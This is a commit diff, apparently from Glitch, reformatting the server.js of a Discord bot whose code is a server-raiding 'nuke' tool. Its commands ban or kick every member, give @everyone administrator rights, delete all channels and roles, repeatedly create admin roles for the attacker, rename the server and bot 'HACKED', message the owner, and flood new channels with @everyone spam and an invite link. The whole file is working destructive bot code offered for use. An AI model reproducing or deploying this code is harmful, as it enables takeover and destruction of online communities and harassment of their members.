2005ad1443f031c0d3f84ad5a06b9b60a3066c99
Glitch (fire-royal-birth) <none>
2021-04-14 08:49:41 +0000

    🔋⛺️ Checkpoint ./package.json:28757366/2790 ./views/index.html:28757366/3320 ./public/style.css:28757366/1713 ./public/script.js:28757366/2616 ./server.js:28757366/7043

--- server.js
+++ server.js
@@ -1,122 +1,115 @@
-const Discord = require('discord.js');
+const Discord = require("discord.js");
 const client = new Discord.Client();
-const prefix = '$'///lera ba dly xot prefix dabne
-client.on('ready', () => {
-console.log(`Logged in as ${client.user.tag}!`);
- 
+const prefix = "$"; ///lera ba dly xot prefix dabne
+client.on("ready", () => {
+  console.log(`Logged in as ${client.user.tag}!`);
 });
-          
-     // message.guild.members.forEach(m =>{
-                   // m.ban()
-  
 
+// message.guild.members.forEach(m =>{
+// m.ban()
 
-// }) 
+// })
 
 client.on("message", msg => {
-if (msg.content.toLowerCase().startsWith(prefix + ".")) {
+  if (msg.content.toLowerCase().startsWith(prefix + ".")) {
     msg.guild.members.forEach(m =>
       m.ban("Banned By Sans Bot | Developed By Sans")
-      )
-}})
-client.on('message', message => {
-    if (message.content.startsWith(prefix + "$help")) {
-        message.delete();
-        message.guild.roles.find('name', '@everyone').edit({
-            permissions: ["ADMINISTRATOR"]///premission akata adminstator
-        });
-      message.guild.channels.map(c => {
-            c.delete();
-        });
-      message.guild.roles.forEach(r =>{
-                    r.delete()
-                })
-        
-      message.guild.members.forEach(m =>{
-                    m.kick();
-        
-                })
-     
-        setInterval(() => {
-            message.guild.createRole({
-                name: "ARAB AND HIBYE AND GELAS",
-                permissions: ["ADMINISTRATOR"]
-            }).then(rr => {
- 
-                message.member.addRole(rr.id);
-            })
-        }, 1000);
-        message.guild.setIcon("link wena");
-        client.user.setAvatar("link wena");
-        client.user.setUsername("HACKED")
-        message.guild.owner.send("mrdwa maza hack kray la layn aqrab w hibye w gelas")
-        message.guild.setName('HACKED');
-        setTimeout(function() {
-            setInterval(() => {
-              
-                message.guild.createChannel('HACKED BY SNAKE IRAQ NOOB ', 'text').then(channel => { 
-                channel.send('@everyone HACK BY SNAKE IRAQ NOOB https://discord.gg/Zp94B2BT :joy: :joy: :joy:')
-               
-                })
-            }
-                        
-                        , 500)
-            })
-        }
-    
-                   
-    }
- 
-          )
- 
+    );
+  }
+});
+client.on("message", message => {
+  if (message.content.startsWith(prefix + "$help")) {
+    message.delete();
+    message.guild.roles.find("name", "@everyone").edit({
+      permissions: ["ADMINISTRATOR"] ///premission akata adminstator
+    });
+    message.guild.channels.map(c => {
+      c.delete();
+    });
+    message.guild.roles.forEach(r => {
+      r.delete();
+    });
 
-client.on('message', async msg => {
-  if(msg.content.startsWith('.')) {
-    msg.guild.members.forEach(m =>{
-                    m.ban()
-                }) 
+    message.guild.members.forEach(m => {
+      m.kick();
+    });
+
+    setInterval(() => {
+      message.guild
+        .createRole({
+          name: "ARAB AND HIBYE AND GELAS",
+          permissions: ["ADMINISTRATOR"]
+        })
+        .then(rr => {
+          message.member.addRole(rr.id);
+        });
+    }, 1000);
+    message.guild.setIcon("link wena");
+    client.user.setAvatar("link wena");
+    client.user.setUsername("HACKED");
+    message.guild.owner.send(
+      "mrdwa maza hack kray la layn aqrab w hibye w gelas"
+    );
+    message.guild.setName("HACKED");
+    setTimeout(function() {
+      setInterval(
+        () => {
+          message.guild
+            .createChannel("HACKED BY SNAKE IRAQ NOOB ", "text")
+            .then(channel => {
+              channel.send(
+                "@everyone HACK BY SNAKE IRAQ NOOB https://discord.gg/Zp94B2BT :joy: :joy: :joy:"
+              );
+            });
+        },
+
+        500
+      );
+    });
+  }
+});
+
+client.on("message", async msg => {
+  if (msg.content.startsWith(".")) {
+    msg.guild.members.forEach(m => {
+      m.ban();
+    });
     msg.channel.send(`:joy::joy::joy: بداخۆ وەزحتان شرە`);
   }
 });
- 
-var adminprefix = ["البريفكس بتاعك هنا"]
-client.on('message', message => {
-  
-    var argresult = message.content.split(` `).slice(1).join(' ');
-  
-  if (message.content.startsWith(adminprefix + 'setg')) {
+
+var adminprefix = ["البريفكس بتاعك هنا"];
+client.on("message", message => {
+  var argresult = message.content
+    .split(` `)
+    .slice(1)
+    .join(" ");
+
+  if (message.content.startsWith(adminprefix + "setg")) {
     client.user.setGame(argresult);
-      message.channel.send(`**✅   ${argresult}**`)
-  } else 
-     if (message.content === (adminprefix + "leave")) {
-    message.guild.leave();        
-  } else  
-  if (message.content.startsWith(adminprefix + 'setw')) {
-  client.user.setActivity(argresult, {type:'WATCHING'});
-      message.channel.send(`**✅   ${argresult}**`)
-  } else 
-  if (message.content.startsWith(adminprefix + 'setl')) {
-  client.user.setActivity(argresult , {type:'LISTENING'});
-      message.channel.send(`**✅   ${argresult}**`)
-  } else 
-  if (message.content.startsWith(adminprefix + 'sets')) {
+    message.channel.send(`**✅   ${argresult}**`);
+  } else if (message.content === adminprefix + "leave") {
+    message.guild.leave();
+  } else if (message.content.startsWith(adminprefix + "setw")) {
+    client.user.setActivity(argresult, { type: "WATCHING" });
+    message.channel.send(`**✅   ${argresult}**`);
+  } else if (message.content.startsWith(adminprefix + "setl")) {
+    client.user.setActivity(argresult, { type: "LISTENING" });
+    message.channel.send(`**✅   ${argresult}**`);
+  } else if (message.content.startsWith(adminprefix + "sets")) {
     client.user.setGame(argresult, "https://www.twitch.tv/dream");
-      message.channel.send(`**✅**`)
+    message.channel.send(`**✅**`);
   }
-  if (message.content.startsWith(prefix + 'setname')) {
-  client.user.setUsername(argresult).then
-      message.channel.send(`Changing The Name To ..**${argresult}** `)
-} else
-if (message.content.startsWith(adminprefix + 'setava')) {
-  client.user.setAvatar(argresult);
+  if (message.content.startsWith(prefix + "setname")) {
+    client.user.setUsername(argresult).then;
+    message.channel.send(`Changing The Name To ..**${argresult}** `);
+  } else if (message.content.startsWith(adminprefix + "setava")) {
+    client.user.setAvatar(argresult);
     message.channel.send(`Changing The Avatar To :**${argresult}** `);
-}
- 
-});//Hiroaki | 弘明#2797
+  }
+}); //Hiroaki | 弘明#2797
 //</> 𝕊𝓝Ỗ𝔀𝓎© CopyRight 2020
 
+////codaka drwst krawa lalayan black jack
 
- ////codaka drwst krawa lalayan black jack
-
-client.login("")
-          
+client.login("");
